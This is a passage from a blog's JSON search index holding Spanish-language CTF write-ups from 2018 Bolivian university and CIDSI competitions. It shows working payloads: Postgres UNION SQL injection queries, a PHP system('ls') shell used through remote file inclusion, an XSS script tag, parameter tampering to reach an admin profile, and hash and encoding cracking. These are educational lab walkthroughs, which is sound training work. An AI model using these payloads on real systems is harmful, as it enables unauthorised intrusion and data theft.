equipos.\nCualquier duda, consulta o reclamo pueden escribirme, espero les gustara el WriteUp.\n-Hackers are People Too 😜\nlinks de interés   Tabla completa de posiciones de pregrado/posgrado, click aqui los retos eran los mismos para ambos grados\n  Para ver información de evento aqui\n  links de la Serie  CTF UMSS WriteUp WirteUp Demo CTF CIDSI 2018 ","permalink":"https://drayko.github.io/es/post/writeup-cidsi18/","tags":["CTF","WriteUp","featured"],"title":"WriteUp CTF CIDSI 2018"},{"categories":null,"contents":"Esta es la segunda parte de la serie de CTFs rumbo al CIDSI 2018. Esta vez el CTF fue realizado en la Universidad Mayor de San Simón (UMSS), manera de eliminatorias para los que iríamos al evento(CIDSI) representando a nuestra universidad\nEste CTF fue organizado por la Sociedad Científica de Estudiantes de Sistemas e Informática (SCESI-UMSS) con el apoyo de la Jefatura de Carreras de Informática y Sistemas de la Universidad Mayor de San Simón (UMSS), además de @crhystamil quien fue el que realizo los retos, muchas gracias por tan buenos retos!\nEstuvo alojado en la plataforma de FBCTF, y participamos en equipo como Dark Army con Israel, Rafael y mi persona, logrando el 1er puesto, sin mas preámbulos, empecemos!\n1.-\n problema: ZmxhZ3tVTVNTX2VkdV9TY2VzaV9DdGZ9Cg==\n solución: Algo sencillo para empezar, como podemos ver, la solucion esta en Base64\nLa flag es:\n1flag{UMSS_edu_Scesi_Ctf}  2.-\n Se muy observador y encuentra el flag para este reto.\n solución: Bueno, en el problema nos da un login: Podríamos intentar mas de una forma de burlar el login, pero primero revisemos el código fuente, nos muestra que el login esta siendo verificado con Javascript:\n1var _0x9045=[\u0026#34;\\x76\\x61\\x6C\\x75\\x65\u0026#34;,\u0026#34;\\x75\\x73\\x65\\x72\\x6E\\x61\\x6D\\x65\u0026#34;,\u0026#34;\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\u0026#34;,\u0026#34;\\x70\\x61\\x73\\x73\\x77\\x6F\\x72\\x64\u0026#34;,\u0026#34;\\x45\\x48\\x43\u0026#34;,\u0026#34;\\x4D\\x33\\x52\\x6F\\x61\\x57\\x4D\\x30\\x62\\x46\\x39\\x6F\\x4E\\x47\\x4E\\x72\\x4D\\x57\\x35\\x6E\u0026#34;,\u0026#34;\\x46\\x4C\\x41\\x47\\x20\\x65\\x6E\\x63\\x6F\\x6E\\x74\\x72\\x61\\x64\\x61\\x21\\x21\\x2C\\x20\\x69\\x6E\\x67\\x72\\x65\\x73\\x61\\x20\\x65\\x6C\\x20\\x66\\x6C\\x61\\x67\\x20\\x65\\x6E\\x20\\x65\\x6C\\x20\\x66\\x6F\\x72\\x6D\\x61\\x74\\x6F\\x20\\x66\\x6C\\x61\\x67\\x7B\\x2E\\x2E\\x2E\\x2E\\x7D\u0026#34;,\u0026#34;\\x6C\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\u0026#34;,\u0026#34;\\x69\\x6E\\x64\\x65\\x78\\x2E\\x68\\x74\\x6D\\x6C\u0026#34;,\u0026#34;\\x59\\x6F\\x75\\x20\\x68\\x61\\x76\\x65\\x20\\x6C\\x65\\x66\\x74\\x20\u0026#34;,\u0026#34;\\x20\\x61\\x74\\x74\\x65\\x6D\\x70\\x74\\x3B\u0026#34;,\u0026#34;\\x64\\x69\\x73\\x61\\x62\\x6C\\x65\\x64\u0026#34;,\u0026#34;\\x73\\x75\\x62\\x6D\\x69\\x74\u0026#34;];var attempt=3;function validate(){var _0xd22bx3=document[_0x9045[2]](_0x9045[1])[_0x9045[0]];var _0xd22bx4=document[_0x9045[2]](_0x9045[3])[_0x9045[0]];if(_0xd22bx3== _0x9045[4]\u0026amp;\u0026amp; _0xd22bx4== atob(_0x9045[5])){alert(_0x9045[6]);window[_0x9045[7]]= _0x9045[8];return false}else {attempt--;alert(_0x9045[9]+ attempt+ _0x9045[10]);if(attempt== 0){document[_0x9045[2]](_0x9045[1])[_0x9045[11]]= true;document[_0x9045[2]](_0x9045[3])[_0x9045[11]]= true;document[_0x9045[2]](_0x9045[12])[_0x9045[11]]= true;return false}}} Sin embargo esta ofuscado, podemos buscar muchos sitios en linea para desofuscarlo y tenerlo mas comprensible:\n1var attempt = 3; 2 3function validate() { 4 var _0xd22bx3 = document[\u0026#39;getElementById\u0026#39;](\u0026#39;username\u0026#39;)[\u0026#39;value\u0026#39;]; 5 var _0xd22bx4 = document[\u0026#39;getElementById\u0026#39;](\u0026#39;password\u0026#39;)[\u0026#39;value\u0026#39;]; 6 if (_0xd22bx3 == \u0026#39;EHC\u0026#39; \u0026amp;\u0026amp; _0xd22bx4 == atob(\u0026#39;M3RoaWM0bF9oNGNrMW5n\u0026#39;)) { 7 alert(\u0026#39;FLAG encontrada!!, ingresa el flag en el formato flag{....}\u0026#39;); 8 window[\u0026#39;location\u0026#39;] = \u0026#39;index.html\u0026#39;; 9 return false 10 } else { 11 attempt--; 12 alert(\u0026#39;You have left \u0026#39; + attempt + \u0026#39; attempt;\u0026#39;); 13 if (attempt == 0) { 14 document[\u0026#39;getElementById\u0026#39;](\u0026#39;username\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; 15 document[\u0026#39;getElementById\u0026#39;](\u0026#39;password\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; 16 document[\u0026#39;getElementById\u0026#39;](\u0026#39;submit\u0026#39;)[\u0026#39;disabled\u0026#39;] = true; 17 return false 18 } 19 } 20} Podemos analizar que el username es: EHC, y el password esta oculto en Base64(atob): 3thic4l_h4ck1ng. Entonces el login nos dice que la flag es la password con el formato flag{...}:\n1flag{3thic4l_h4ck1ng}  3.-\n file_5e9666c7a0773f3785123f19986b4c5f\n nos dan un archivo de texto, el cual contiene lo siguiente\ncomo podemos observar, se trata de un hexdump, podriamos revertirlo con xxd:\n1xxd -r file_5e9666c7a0773f3785123f19986b4c5f \u0026gt; myfile el cual nos da una imagen:\ny directamente nos da la flag\n1flag{FL4g_Facil_o_Difici1}  4.-\n SQLi\n solución: bueno... nos dio un login con captcha de google, realmente odie este reto y ni que decir de mi equipo, gracias @crhystamil :) jejeje, pero, continuemos, claramente se trataba de hacer una inyeccion SQL, sin embargo probamos con el tipico admin:admin el cual nos daba una respuesta de Buen_Intento_Pero_EsteNo_esEl_Flag, con esto se podia deducir que era un usuario valido pero no el que buscamos.\nDespues de varios intentos con sentencias MySql... probe con Postgres con admin como password, para cumplir una consulta valida por supuesto\n1-\u0026#39; UNION ALL SELECT NULL,NULL,current_database(),NULL-- nos responde con ctf :D\nAhora continuamos intentando llamar a las tablas existentes.\n1-\u0026#39; UNION ALL SELECT NULL,NULL,table_name,NULL FROM information_schema.tables LIMIT 1 OFFSET 0-- respuesta: users por suerte nos salta la tabla que queremos al primer intento, sin embargo, no nos deja hacer las peticiones directamente, sino mas bien encodeandola.\n1users =\u0026gt; CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115) Lo cual seria en base ASCII.\nQuedaria algo asi:\n1-\u0026#39; UNION ALL SELECT NULL,NULL,column_name,NULL FROM information_schema.columns where table_name=CHR(117)||CHR(115)||CHR(101)||CHR(114)||CHR(115) LIMIT 1 OFFSET 0-- Entonces en las respuestas vamos enumerando aumentando el OFFSET, las columnas que pueden sernos utiles: id, users, pass, flag. Con esta ultima ya vamos a un solo paso de lograrla, sin embargo...\n1-\u0026#39; UNION ALL SELECT NULL,NULL,flag,NULL FROM ctf.public.users LIMIT 1 OFFSET 29-- La respuesta se encontraba hasta el intento 29, nuevamente gracias @crhystamil.\nla flag:\n1DJC{Buen_Intento_esEl_Flag}  5.-\n Cuidado con ejecutar todo\n en este caso nos da un host en el cual esta ejecutando hasta las imagenes que tiene, lo cual es una mala practica obviamente, nos da la puerta a unRFI, asi que desde un servidor remoto tratamos de ubicar la flag con una shell rapida\n1\u0026lt;?php 2 system(‘ls’); 3?\u0026gt;el cual nos muestra los archivos en el directorio actual, en el cual existia un archivo el cual al leerlo nos daba el flag, simplemente cambiando el la URL por el archivo que lo contiene -2s3d5f6g7g549fy4nfp734lk37-\nLa flag:\n1flag{3hc_gr0up_h4ck1ng_Dragonjar}  6.-\n análisis de firmware\n nos dan una imagen para analizarla: open-hacking_151b4da179e4163e7e879da22e0c76e2.bin\nLa cual podremos analizarla para extraer los archivos que contenga con Binwalk\n1binwalk -Me open-hacking_151b4da179e4163e7e879da22e0c76e2.bin Entonces podemos analizar, y conseguimos la flag:\n1bandera{43320192606d672bf0db1280026c799902f03bdd} creo que eso seria :D sin embargo no son todos los problemas, no pudimos completarlos :( y gracias a @crhystamil! por preparar este divertido CTF :D\nel siguiente write up es el de CIDSI!\n-Hackers are People Too 😜\nlinks de la Serie\n El anterior WriteUp(CIDSI Demo WriteUp) WriteUp CTF CIDSI18 ","permalink":"https://drayko.github.io/es/post/writeup-ctfumss18/","tags":["CTF","WriteUp"],"title":"Write Up CTF UMSS 2018"},{"categories":null,"contents":"Que tal?!\nEste es el inicio de una serie de posts de CTFs que fueron rumbo al Congreso Internacional De Seguridad Informática (CIDSI)\nque fue organizado por la Agencia de Gobierno Electrónico y Tecnologías de Información y Comunicación (AGETIC) gracias a las gestiones del Centro de Gestión de Incidentes Informáticos(CGII) realizado del 29 de Noviembre al 1 de Diciembre del 2018\nEmpezamos con el primer CTF organizado como demo por el CGII.\n1. Introducir el flag\n Este solo es un reto demostrativo para mostrar como funciona la plataforma.\nEl reto solo consiste en enviar la bandera (flag) La bandera (Flag) es: 327a6c4304ad5938eaf0efb6cc3e53dc\n solución: En el enunciado nos dan directamente la Flag:\n1327a6c4304ad5938eaf0efb6cc3e53dc  2. Web site\n Ahora el reto sera un poco mas \u0026quot;dificil\u0026quot;. Uno de los programadores de la AGETIC quizo darte una ayuda y te dejo una pista del flag en el sitio del evento. Link: https://www.cgii.gob.bo/eventos/cidsi2018/\n solución: Debemos examinar el código de la pagina, podemos inspeccionar presionando F12 u Ctrl+U Entonces la flag es:\n18ddeb2027a8c79b3c46510a6dcef9dda  3. Panel administrativo\n Malas configuraciones de seguridad.\nLos desarrolladores usualmente usan passwords por defecto o fáciles de adivinar.\nEstas comenzando a desarrollar tus habilidades de hacker, en eso vas de visita a una empresa y te conectas a su red interna. ¡Sorpresa! encontraste el panel de administración de su sistema de personal. Tu reto: debes logearte como administrador, si lo logras un flag sera tu recompenza.\n solución: existen muchas combinaciones de usuarios y contraseñas por defecto o usuales, por ejemplo la siguiente lista.\npero probemos uno de los mas usuales el típico admin/admin\nestupendo! esta es la flag:\n158FD79FEF76B8D579819C5FA615A25930F111C04627C3F374C5D7DF898A5FEADE1598AA0680BDF5B922ACBE396691FD1943A181E362F32FFCC0B29A6DD725BA0  4. Cracking\n Crackeando el hash\nHoy en dia el algoritmo de encriptación MD5 ya no es considerado seguro.\nUn amigo hacker esta realizando un evaluación de seguridad (Ethical hacking), tuvo acceso a una base de datos de usuarios y si logra acceder con algun usuario podra ganar privilegios y mantener muchos más accesos. Te pide ayuda para \u0026quot;romper\u0026quot; un hash, no actualizado por suerte. Si puedes ayudarlo, tu recompenza es la bandera (flag) que es el texto plano (sin encriptar) del hash 3cc31cd246149aec68079241e71e98f6\n solución: Buscamos en Google el hash y por suerte, muchas paginas tienen ya almacenado ese. Caso contrario tenemos herramientas como Hashcat o el clásico John The Ripper. Por suerte la respuesta esta en Google.\n1Pa$$w0rd  5. Cracking 2\n Estas de vacaciones en un hotel 5 estrellas. A un amigo tuyo se le ocurrio capturar trafico con la herramienta wireshark y para la alegria del grupo pudo capturar el ingreso de un empleado a la intranet donde estan las promociones para ganar noches gratis en el hotel. Lamentablemente el password parece estar \u0026quot;encriptado\u0026quot;, pero esto es fácil para ti, si lo descubres el password es la bandera. El hash capturado es : ODcwMzM2NzA5ODUwMDUzNA==\n solución: Si tienes mas experiencia se puede notar a simple vista q es un Base64, o en su defecto pero poco probable un Base 32, sin embargo existen muchos identificadores de encodeados, buscalos en Google ;)\nLa flag es:\n18703367098500534  6. Cracking 3\n Haciendo pruebas de captura de tráfico capturas lo que aparentemente es un hash: MNQXA4TJMNXXE3TJN4======\nTu misión es obtener el texto plano de ese \u0026quot;hash\u0026quot;\nPista: El algoritmo usado para este reto es la \u0026quot;mitad de dificil\u0026quot; de base64.\n solución: En el enunciado nos dan la pista de base32 La flag es:\n1capricornio  7. Cracking 4\n Un amigo esta haciendo un postgrado en seguridad de la información pero se falto a la primera clase de criptografia y te pide ayuda para resolver su tarea que es decodificar el texto : ynivqnrftravny\nPista: Si hoy fuera \u0026quot;martes 13\u0026quot; las cosas serian mas fáciles.\n solución: La pista hace referencia a ROT13 o cifrado cesar, podemos buscar en Google una pagina para decodear ROT13, comprobamos y efectivamente es :D\nLa flag es:\n1lavidaesgenial  8. Buscar usuario\n Muy a menudo los programadores no sanitizan las entradas por parte de un usuario.\nEncontramos un sitio en linea, que te ofrece invitaciones VIP a eventos especiales, para poder acceder a ellos necesitas mostrar un alert con javascript. Obviamente debes ejecutarlo. ¿Te animas a probar? Sabemos que eres un programador experto. Si lo logras el flag sera tu premio.\n solución: Nos sugiere un ataque de XSS, intentemos algo sencillo, introducir directamente el script\n1\u0026lt;script\u0026gt;alert(\u0026#34;XSS\u0026#34;)\u0026lt;/script\u0026gt; y nos resulta! :D\ny la respectiva respuesta\nLa flag:\n111B0C9EBB6D5A0E0E4AE5B1F604B9E8111FEDF991173667AEB2D14F91ACC3B62FB6A5FD4E9AF37BAF09932150BF0D89A3B89F2B9F135347799D95DB38A4AC515  9. Ver perfil\n Vamos avanzando, la empresa de chocolates esta realizando envios gratuitos a una lista aleatorea y son muchos chocolates. Para entrar al sistema que contiene la lista. Debes cambiar el permiso porque ahora solo tienes el rol de técnico, pero si eres administrador podria tener todo el chocolate que quieras. Tu reto es tener acceso al perfil del administrador. Tu recompenza además del chocolate es el flag que es la persona de contacto.\n solución: Examinemos las cabeceras de la petición que se envía al darle a \u0026quot;Actualiza tu perfil\u0026quot;\n1POST /eventos/cidsi2018/ctfdemo/lessons/fdb94122d0f032821019c7edf09dc62ea21e25ca619ed9107bcc50e4a8dbc100 HTTP/1.1 2Host: www.cgii.gob.bo 3Accept: */* 4Accept-Language: en-US,en;q=0.5 5Accept-Encoding: gzip, deflate 6Referer: https://www.cgii.gob.bo/eventos/cidsi2018/ctfdemo/lessons/fdb94122d0f032821019c7edf09dc62ea21e25ca619ed9107bcc50e4a8dbc100.jsp 7Content-Type: application/x-www-form-urlencoded 8X-Requested-With: XMLHttpRequest 9Content-Length: 16 10Connection: close 11 12username=tecnico Como nos sugiere en el enunciado tratemos de acceder al administrador, si modificamos el username a:\n1username=administrador Voilà! la flag es:\n1E762A4B454B64E50ED992465C1FBD424A5FB7184E9AA89B901D9ACD9B311AB3D927647D3BBC1BC52BDDEC560A005F72638F2C69D0D60169EBF621ABE8BF14A74 Como diríamos en Bolivia... esito seria. Los siguientes Write Ups se irán publicando pronto, e indexando aquí y en cada uno de ellos. Hasta la próxima!\n-Hackers are People Too 😜\nlinks de la Serie\n CTF UMSS WriteUp WirteUp CTF CIDSI18 ","permalink":"https://drayko.github.io/es/post/writeup-democidsi18/","tags":["CTF","WriteUp"],"title":"Write Up del CTF Demo CIDSI 2018"},{"categories":null,"contents":"¡Busca contenido en el blog!\n","permalink":"https://drayko.github.io/es/search/","tags":null,"title":"Search Results"}]